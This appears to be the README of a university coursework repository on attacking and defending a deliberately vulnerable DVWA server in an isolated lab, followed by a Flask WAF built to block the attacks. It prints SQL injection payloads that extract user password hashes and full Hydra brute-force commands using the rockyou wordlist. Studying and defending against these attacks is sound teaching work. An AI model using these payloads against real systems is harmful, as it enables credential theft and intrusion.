# ELEC0138 Security & Privacy

---

## Overview

This repository contains all code, data, and setup documentation for **CW1** (Threat Modelling & Attack Simulation) and **CW2** (Security & Privacy Defence Strategy) of ELEC0138. The coursework simulates a corporate IT infrastructure (AcmeCorp) and demonstrates three realistic attack scenarios using industry-standard ethical hacking tools, followed by a multi-layered Flask WAF reverse proxy that defends against those attacks — all conducted in an isolated VirtualBox lab environment.

---

## Lab Environment

| Machine | OS | IP | Role |
|---|---|---|---|
| Attacker | Kali Linux 2026.1 (ARM64) | 10.0.0.1 | Attack platform |
| Target | Ubuntu Server 24.04 (ARM64) | 10.0.0.2 | DVWA web server |

Both VMs are connected via a VirtualBox internal network named `corpnet` (10.0.0.0/24). No external traffic was involved in any attack.

---

## Attacks Demonstrated

### 1. Network Reconnaissance — Nmap
**Command:**
```bash
nmap -sV -sC -p 80 10.0.0.2
```
**Finding:** Port 80 open, running Apache httpd 2.4.58 (Ubuntu). Server broadcasts its exact version in HTTP response headers — an information disclosure vulnerability (CWE-200) that enables targeted CVE lookups.

---

### 2. SQL Injection — Manual (DVWA) + Automated (Python)
**Target:** `http://10.0.0.2/dvwa/vulnerabilities/sqli/`
**Vulnerability:** CWE-89 | OWASP A03:2021 — Injection

**Phase 1 — Boolean injection** (dump all records):
```
1' OR '1'='1
```

**Phase 2 — UNION injection** (exfiltrate credentials):
```
1' UNION SELECT user, password FROM users #
```

**Result:** All 5 employee usernames and MD5 password hashes exfiltrated. Hash `5f4dcc3b5aa765d61d8327deb882cf99` cracked instantly via CrackStation to `password`.


### 3. Brute Force — Hydra
**Vulnerability:** CWE-307 | OWASP A07:2021 — Identification and Authentication Failures

**Target:** `http://10.0.0.2/dvwa/vulnerabilities/brute/` (DVWA Brute Force vulnerability page, security level: Low)

**Command (CW1 — direct attack on DVWA, no WAF):**
```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.0.0.2 http-get-form "/dvwa/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:H=Cookie:PHPSESSID=<YOUR_PHPSESSID>;security=low:F=Username and/or password incorrect."
```

**Note:** A valid session cookie (`PHPSESSID`) is required to access the authenticated vulnerability page. Log into DVWA as `admin/password`, retrieve the cookie from the browser (F12 → Storage → PHPSESSID), then paste it into the command above.

**Result:** Valid admin credential recovered — `password` — found at attempt 4 of 14,344,399. No rate limiting or account lockout was triggered.

---

## CW2 — Flask WAF Reverse Proxy Defence

The WAF (`waf_proxy.py`) runs on the Kali machine at port 5000 and sits between the attacker and DVWA, implementing five defence layers: SQL injection IPS, account lockout, IP rate limiting, audit logging with live dashboard, and IP pseudonymisation.

**Architecture:**
```
Attacker / Hydra  →  WAF (10.0.0.1:5000)  →  DVWA (10.0.0.2)
```

**Dashboard:** `http://10.0.0.1:5000/waf/dashboard`

**Start the WAF (run on Kali):**
```bash
python3 waf_proxy.py
```

### Brute Force — Hydra against WAF (CW2 defence demo)

**Target:** `http://10.0.0.1:5000/dvwa/vulnerabilities/brute/` (traffic intercepted by WAF)

**Command (CW2 — attack routed through WAF, targeting gordonb):**
```bash
hydra -l gordonb -P /usr/share/wordlists/rockyou.txt 10.0.0.1 -s 5000 http-get-form "/dvwa/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:H=Cookie:PHPSESSID=<YOUR_PHPSESSID>;security=low:F=Username and/or password incorrect." -t 1 -V -f
```

**Flags explained:**
| Flag | Purpose |
|---|---|
| `10.0.0.1 -s 5000` | Target the WAF proxy instead of DVWA directly |
| `-t 1` | Single thread — required so lockout triggers sequentially |
| `-V` | Verbose — print every attempt |
| `-f` | Stop on first valid credential found |
| `F=Username and/or password incorrect.` | Treat any response containing this string as a failed attempt |

**Note:** Use the same `PHPSESSID` cookie retrieved from `http://10.0.0.1:5000/dvwa/login.php` (via the WAF). The correct password for gordonb is `abc123`, which appears at position 10 in RockYou.

**Expected result:** Account locked after 5 failed attempts. `abc123` at attempt 10 is blocked by the WAF lockout — Hydra finds **0 valid credentials**. Dashboard shows 1 Lockout Event and 8 Failed Logins.

---

## How to Replicate

See `setup/lab_setup_commands.sh` for the complete step-by-step terminal commands to build the lab from scratch, including VM network configuration, DVWA installation, WAF deployment, and all attack commands.

---

## Disclaimer

All attacks were performed in a fully isolated virtual lab environment for educational purposes only. No real systems were targeted. This work is submitted in accordance with UCL's academic integrity policy.
